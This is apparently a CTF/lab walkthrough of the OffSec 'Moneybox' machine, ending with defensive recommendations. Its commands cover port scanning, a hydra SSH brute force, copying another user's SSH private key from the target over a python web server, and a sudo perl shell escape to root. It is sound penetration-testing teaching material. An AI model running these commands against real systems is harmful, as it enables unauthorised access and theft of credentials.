Offsec <br>
Moneybox
---

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/54b1acc6-bca3-4ace-861b-24c00ebc55b7)

# Reconnaissance/Scanning:
Let’s start things off with a network scan to see which ports are open and the services running on each.
```
$ nmap -A -O -sC -sV -p- <machine_IP>
```
![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/e0b58188-cfa5-4311-859b-6ce14edb9319)

Next, I ran a gobuster scan and found a directory to check. <br>

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/46c519a2-94fc-4f2e-9fdb-52967d143e5a)
 
I got on the FTP server and downloaded the picture and tried to use some steganography tools on it, but, no luck. <br>
Or I wasn’t using the right wordlist. <br>
Visiting the webpage showed this: <br>

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/fbd27e6d-9c94-4309-8f39-5cfc33453765)

Then on the */blogs* page: <br>

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/2eda2bcb-f6b2-4169-ae8d-32203c6afb0b)

I viewed the source code to see if the hint was there. <br>

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/7b3330a6-0611-40f7-bd41-607c696f8533)

Checking that directory: <br>

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/d95d1d5d-ac62-47a5-85fa-f1088fdd81e5)

A likely story, let’s see if the source code has a different opinion. <br>
Looks like the key for the image from the FTP server! <br>

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/c251173d-4833-4f5c-95fd-9dec2c0a78b6)

It sure was!

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/f4765a9b-98f4-42a3-ab37-fe5122f4b88a)

The contents of the text file:

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/88e55e90-1959-4fbc-bf24-24b2a1b7504d)

# Initial foothold:
Got a username, now the next step (since it’s a weak password) is to try to bruteforce the SSH server.
```
$ hydra -l renu -P /usr/share/wordlists/rockyou.txt <machine_IP> ssh
```
![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/0b0d9f93-741e-47e6-8867-bcaef485645f)

Got access to the machine now.

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/457d1ea6-a1e5-4b5f-9df9-8baf08c57f29)

I’ll grab the user flag in the user’s home directory.

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/4d36b715-e4a5-43a2-ab5d-e4d48a978a2c)

Trying to escalate my privileges, I found I couldn’t run anything as root and there were no cronjobs. <br>
Viewing the */etc/passwd* file there was another user named lily.  <br>
I checked for hidden folders in the user renu’s home directory and found the .bash_history file doesn’t erase the output.

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/d41a6529-13ae-4bb6-94f6-fe003529bd8a)

I’ll explain why I found this a goldmine.
```
$ ssh-keygen -t rsa 
# means this user made an rsa key.

$ ssh-copy-id lily@<machine_IP> 
# means to use locally available keys to authorize logins on a remote machine

$ chmod 400 id_rsa
# means that the file permissions are being changed to read only
# (needed permissions when using the rsa key to SSH)
```
With that knowledge, I changed directories into renu’s .ssh directory,  <br>
started up a python server and downloaded the file to my local machine.
```
$ python3 -m http.server <PORT>
# (on target machine) starts a python server on port of choice

$ wget http://<machine_IP>:<PORT>/path/to/file
# (on attack machine) grabs the file of choice to local computer
```
Now I can try to SSH as lily into the machine.

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/6770fd87-9f4d-4051-b2be-dbd80ceda0c0)

# Privilege escalation:
Cool, first thing is to check what this user can run as root and try to escalate privileges.

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/6c5ed1d8-1dd9-4034-9973-d0cab5d784ca)

This is great, there’s a way in! Checking on *gtfobins[.]net* for perl showed me a command to use to escalate privs.
```
$ sudo /usr/bin/perl -e 'exec "/bin/sh";'
```
Root access!

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/89883dc8-a8d8-4b3a-9c3e-9c01b7dbd7b9)

I’ll grab the last flag now.

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/fb3d94bb-2aa7-4d66-a5fd-e7f3e9db29a9)

# Reporting:
* It’s highly advised to disable anonymous login on the FTP server. <br>
* Enable account lockout on the SSH server to prevent bruteforce attacks. <br>
* Check permissions of users/groups to make sure they’re configured properly. <br>
* Passphrase protect the SSH private key files.<br>
* Make sure files containing sensitive information are accessible by the proper people only <br> 
and password protected with a strong password.











